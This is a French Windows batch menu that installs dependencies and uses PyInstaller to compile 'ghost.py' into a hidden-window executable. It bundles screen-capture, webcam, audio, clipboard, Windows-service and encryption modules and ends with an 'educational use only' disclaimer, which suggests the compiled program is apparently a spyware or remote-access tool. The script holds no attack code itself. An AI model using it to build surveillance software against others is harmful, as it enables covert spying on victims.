@echo off
title Ghost Anomalie - Compilateur Ultime
mode con: cols=80 lines=30
color 0A

:: ============================================================
::  GHOST ANOMALIE - COMPILATEU
::  Version: 1.3.0
::  Auteur: Dev Messy
:: ============================================================

set VERSION=1.3.0
set APP_NAME=GhostAnomalie

:menu
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║                                                          ║
echo ║   👻 GHOST ANOMALIE - COMPILATEUR               ║
echo ║   ═══════════════════════════════════════════════════   ║
echo ║   v%VERSION% - Ghost Team                               ║
echo ║                                                          ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo   [1] 🔧 COMPILER GHOST.PY EN EXE
echo   [2] 📦 INSTALLER LES DEPENDANCES
echo   [3] 🧹 NETTOYER LES FICHIERS TEMPORAIRES
echo   [4] 🔄 RECOMPILER (Nettoyer + Compiler)
echo   [5] 🚀 LANCER L'APPLICATION (si compilée)
echo   [6] ❌ QUITTER
echo.
echo   ─────────────────────────────────────────────────────────
echo   📁 Dossier actuel: %CD%
echo   ─────────────────────────────────────────────────────────
echo.
set /p choix="➜ Choisis une option (1-6): "

if "%choix%"=="1" goto compiler
if "%choix%"=="2" goto installer
if "%choix%"=="3" goto nettoyer
if "%choix%"=="4" goto recompiler
if "%choix%"=="5" goto lancer
if "%choix%"=="6" goto fin

echo ❌ Option invalide ! Appuie sur une touche...
pause >nul
goto menu

:: ============================================================
:: INSTALLER LES DEPENDANCES
:: ============================================================
:installer
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   📦 INSTALLATION DES DEPENDANCES                      ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo 🔍 Vérification et installation des dépendances...
echo.

:: Vérifier Python
python --version >nul 2>&1
if errorlevel 1 (
    echo ❌ Python n'est pas installé !
    echo.
    echo 📥 Télécharge Python ici: https://www.python.org/downloads/
    echo ⚠️ N'oublie pas de cocher "Add Python to PATH"
    echo.
    pause
    goto menu
)

echo ✅ Python est installé
python --version
echo.

:: Installer les dépendances
echo 📦 Installation des dépendances Python...
echo.

pip install --upgrade pip

pip install pillow pyinstaller opencv-python pyaudio pywin32 psutil wmi cryptography requests

if errorlevel 1 (
    echo ❌ Erreur lors de l'installation !
    echo.
    echo 💡 Essaie manuellement:
    echo pip install pillow pyinstaller opencv-python pyaudio pywin32 psutil wmi cryptography
    echo.
    pause
    goto menu
)

echo.
echo ✅ Toutes les dépendances sont installées !
echo.
pause
goto menu

:: ============================================================
:: NETTOYER
:: ============================================================
:nettoyer
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   🧹 NETTOYAGE DES FICHIERS TEMPORAIRES               ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

echo 🗑️ Suppression des dossiers de compilation...

if exist "build" (
    rmdir /s /q "build" 2>nul
    echo ✅ build/ supprimé
)

if exist "dist" (
    rmdir /s /q "dist" 2>nul
    echo ✅ dist/ supprimé
)

if exist "__pycache__" (
    rmdir /s /q "__pycache__" 2>nul
    echo ✅ __pycache__/ supprimé
)

if exist "*.spec" (
    del /q *.spec 2>nul
    echo ✅ *.spec supprimés
)

if exist "clients" (
    rmdir /s /q "clients" 2>nul
    echo ✅ clients/ supprimé
)

if exist "build_client" (
    rmdir /s /q "build_client" 2>nul
    echo ✅ build_client/ supprimé
)

echo.
echo ✅ Nettoyage terminé !
echo.
pause
goto menu

:: ============================================================
:: COMPILER
:: ============================================================
:compiler
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   🔧 COMPILATION DE GHOST.PY EN EXE                    ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

:: Vérifier que ghost.py existe
if not exist "ghost.py" (
    echo ❌ Fichier ghost.py introuvable !
    echo.
    echo 💡 Assure-toi que ghost.py est dans le dossier courant
    echo 📁 Dossier: %CD%
    echo.
    pause
    goto menu
)

echo ✅ ghost.py trouvé
echo.

:: Vérifier Python
python --version >nul 2>&1
if errorlevel 1 (
    echo ❌ Python n'est pas installé !
    echo.
    pause
    goto menu
)

:: Vérifier pyinstaller
python -c "import PyInstaller" >nul 2>&1
if errorlevel 1 (
    echo ❌ PyInstaller n'est pas installé !
    echo 📦 Installation en cours...
    pip install pyinstaller
)

echo ⏳ Compilation en cours... (5-10 minutes)
echo 📦 Cela peut prendre du temps, sois patient...
echo.

:: Compiler avec pyinstaller
pyinstaller --onefile --windowed --name "%APP_NAME%" --clean --log-level WARN --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import cv2 --hidden-import pyaudio --hidden-import wave --hidden-import win32api --hidden-import win32con --hidden-import win32gui --hidden-import win32process --hidden-import win32clipboard --hidden-import win32ui --hidden-import win32pdh --hidden-import win32security --hidden-import win32file --hidden-import win32event --hidden-import win32service --hidden-import win32serviceutil --hidden-import win32com.client --hidden-import wmi --hidden-import psutil --hidden-import cryptography --hidden-import cryptography.fernet ghost.py

if errorlevel 1 (
    echo.
    echo ❌ La compilation a échoué !
    echo.
    echo 💡 Vérifie que toutes les dépendances sont installées
    echo 💡 Essaie: compile.bat puis option 2
    echo.
    pause
    goto menu
)

:: Vérifier que l'EXE a été créé
if exist "dist\%APP_NAME%.exe" (
    echo.
    echo ✅ Compilation réussie !
    echo.
    echo 📁 Fichier généré: dist\%APP_NAME%.exe
    echo 📦 Taille: 
    dir "dist\%APP_NAME%.exe" | findstr ".exe"
    echo.
    echo 🚀 Tu peux maintenant lancer %APP_NAME%.exe
    echo.
) else (
    echo.
    echo ❌ L'EXE n'a pas été trouvé
    echo.
)

pause
goto menu

:: ============================================================
:: RECOMPILER (Nettoyer + Compiler)
:: ============================================================
:recompiler
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   🔄 RECOMPILATION COMPLETE                           ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

echo 🧹 Nettoyage préalable...
if exist "build" rmdir /s /q "build" 2>nul
if exist "dist" rmdir /s /q "dist" 2>nul
if exist "__pycache__" rmdir /s /q "__pycache__" 2>nul
if exist "*.spec" del /q *.spec 2>nul
if exist "build_client" rmdir /s /q "build_client" 2>nul
echo ✅ Nettoyage terminé
echo.

echo 🔧 Lancement de la compilation...
echo.

goto compiler

:: ============================================================
:: LANCER L'APPLICATION
:: ============================================================
:lancer
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   🚀 LANCEMENT DE L'APPLICATION                       ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

if exist "dist\%APP_NAME%.exe" (
    echo ✅ Lancement de %APP_NAME%.exe...
    echo.
    start /b "" "dist\%APP_NAME%.exe"
    echo ✅ Application lancée !
    echo.
) else (
    echo ❌ Fichier dist\%APP_NAME%.exe introuvable !
    echo.
    echo 💡 Utilise d'abord l'option 1 pour compiler
    echo.
)

pause
goto menu

:: ============================================================
:: FIN
:: ============================================================
:fin
cls
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║                                                          ║
echo ║   👻 Merci d'avoir utilisé Ghost Anomalie              ║
echo ║                                                          ║
echo ║   ⚠️  N'oublie pas : usage éducatif uniquement !      ║
echo ║   🔒 Utilise sur TES propres machines uniquement       ║
echo ║                                                          ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo Appuie sur une touche pour quitter...
pause >nul
exit